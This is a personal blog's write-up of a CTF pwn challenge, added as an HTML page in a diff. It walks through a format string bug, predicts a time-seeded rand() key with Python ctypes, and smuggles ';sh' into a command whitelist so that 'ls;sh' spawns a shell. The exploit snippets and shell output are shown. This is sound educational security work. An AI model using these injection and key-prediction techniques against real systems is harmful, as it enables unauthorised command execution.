@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title> | papichulo16</title>
+  <link rel="stylesheet" href="/assets/css/style.css">
+  
+</head>
+<body>
+  <nav class="navbar">
+    <a class="menu home-link" href="/"><img src="/assets/img/chavo.png" alt="El chavo" class="pfp-img">papichulo16</a>
+
+    <div class="nav-right">
+      <a href="https://github.com/papichulo16">Github</a>
+      <a href="/contact">Contact</a>
+      <a href="/reviews">Reviews</a>
+      <div class="dropdown">
+        <span><a href="/projects">Projects ▾</a></span>
+        <div class="dropdown-content">
+          
+            <a href="/projects/1_magical_kernel.html">Magical Kernel</a>
+          
+            <a href="/projects/2_crap.html">C.R.A.P</a>
+          
+            <a href="/projects/6_ctf_writeups.html">PWN Writeups</a>
+          
+        </div>
+      </div>
+    </div>
+  </nav>
+  <hr>
+
+  <main>
+    <article class="post">
+
+  <header class="post-header">
+    <h1 class="post-title"></h1>
+  </header>
+
+  <div class="post-content">
+    <p>This challenge took a lot longer than I would like to admit.</p>
+
+<p>So first of all, this challenge gives you a list of commands you can run which is stored in a buffer called <code class="language-plaintext highlighter-rouge">whitelist</code>. Then it asks for your input and if your input matches one of the strings in the array, then it will call it. The program will look like this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"Welcome to the club. It's ok, don't be in a rush. You've got all the time in the world. As long as you are a vip that is."
+
+Commands: clear exit ls  
+&gt; ls
+Executing: ls...
+
+flag.txt
+vip_blacklist
+vip.py
+
+Commands: clear exit ls  
+&gt; sh
+Executing: sh...
+
+Command not allowed
+</code></pre></div></div>
+
+<p>One of the first things I noticed, before even checking the disassembly code, is that this program also had a format string bug.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Commands: clear exit ls  
+%p 
+Executing: 0x7ffe54bf56f0f0...
+
+Command not allowed
+</code></pre></div></div>
+
+<p>The code where the bug is located looks like this:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sprintf</span><span class="p">(</span><span class="n">formatted_input</span><span class="p">,</span><span class="n">input</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>(A little foreshadow) This bug led to a very deep rabbit hole because the program did not have a large enough buffer to try to write anywhere outside of the stack. I did get some base leaks though!!! (it was not needed).</p>
+
+<p>Anyways, ignoring the printf vulnerability, you see that the program sets a key through a function called <code class="language-plaintext highlighter-rouge">randGen()</code> and then checks that if the input is the same as the key, then to call a function named <code class="language-plaintext highlighter-rouge">allowCopy()</code> that would add a command to the list called <code class="language-plaintext highlighter-rouge">queue</code>. The command itself isn’t important, but the function is.</p>
+
+<p>Now the first thing that needs to be done is to find a way to get the key and luckily, it is not that bad. What it does is it sets an <code class="language-plaintext highlighter-rouge">srand()</code> seed with the time and then creates a key with just running <code class="language-plaintext highlighter-rouge">rand()</code> a few times. The function looks like so:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">randGen</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="n">param_1</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">rand</span><span class="p">;</span>
+  <span class="kt">void</span> <span class="o">*</span><span class="n">val_at_heap</span><span class="p">;</span>
+  <span class="kt">time_t</span> <span class="n">now</span><span class="p">;</span>
+  <span class="n">ulong</span> <span class="n">i</span><span class="p">;</span>
+  
+  <span class="n">val_at_heap</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
+  <span class="n">now</span> <span class="o">=</span> <span class="n">time</span><span class="p">((</span><span class="kt">time_t</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
+  <span class="n">srand</span><span class="p">((</span><span class="n">uint</span><span class="p">)</span><span class="n">now</span><span class="p">);</span>
+  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">rand</span> <span class="o">=</span> <span class="o">::</span><span class="n">rand</span><span class="p">();</span>
+    <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">i</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">val_at_heap</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">rand</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="o">*</span><span class="n">param_1</span> <span class="o">=</span> <span class="n">val_at_heap</span><span class="p">;</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Which means that I can simulate this exactly through python by using the <code class="language-plaintext highlighter-rouge">ctypes</code> library and creating the key like this:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># get into the queue
+</span><span class="n">d</span> <span class="o">=</span> <span class="n">datetime</span><span class="p">.</span><span class="n">now</span><span class="p">()</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">CDLL</span><span class="p">(</span><span class="s">"/usr/lib/libc.so.6"</span><span class="p">)</span>
+<span class="n">timestamp</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">time</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">srand</span><span class="p">(</span><span class="n">timestamp</span><span class="p">)</span>
+
+<span class="n">key</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
+    <span class="n">rand</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">rand</span><span class="p">()</span>
+    <span class="n">last_byte</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">rand</span><span class="p">)[</span><span class="o">-</span><span class="mi">2</span><span class="p">:]</span>
+    
+    <span class="n">key</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">last_byte</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="n">i</span><span class="p">)</span>
+
+<span class="n">modified</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">key</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffffff</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">key</span> <span class="o">&gt;&gt;</span> <span class="mi">64</span><span class="p">)</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">modified</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Now that you’re in the queue, you can see that there is a bug because it will write however many bytes the <code class="language-plaintext highlighter-rouge">read()</code> function returns but then do <code class="language-plaintext highlighter-rouge">strlen()</code> and then check each index to the string <code class="language-plaintext highlighter-rouge">queue\x00clear\x00exit\x00\x00ls</code> to “make sure that nothing was changed”, but if you enter that exactly plus <code class="language-plaintext highlighter-rouge">;sh</code> at the end, you will write <code class="language-plaintext highlighter-rouge">ls;sh</code> to the whitelist.</p>
+
+<p>And if you run <code class="language-plaintext highlighter-rouge">ls;sh</code> you will get a shell.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"queue</span><span class="se">\x00</span><span class="s">clear</span><span class="se">\x00</span><span class="s">exit</span><span class="se">\x00\x00</span><span class="s">ls;sh"</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"ls;sh"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Commands: queue clear exit ls;sh 
+Executing: ls;sh...
+
+flag.txt
+vip_blacklist
+vip.py
+writeup.md
+$ whoami
+papichulo
+</code></pre></div></div>
+
+<p>Now the problem I had with this challenge is that for the LONGEST TIME I thought that the program would check for <code class="language-plaintext highlighter-rouge">queue\x00clear\x00exit\x00\x00ls\x00</code> and because I thought that it would check for that final null byte, I was thinking to write <code class="language-plaintext highlighter-rouge">;sh</code> after it and then with the format string bug I would try to overwrite the null byte to a semicolon. And because of that a lot of time was lost but it is okay lesson learned. Read things more carefully hahahahhahaha.</p>
+
+
+  </div>
+
+</article>
+
+  </main>
+
+  <footer>
+    <hr>
+    © 2025 papichulo16
+  </footer>
+</body>
+</html>
+
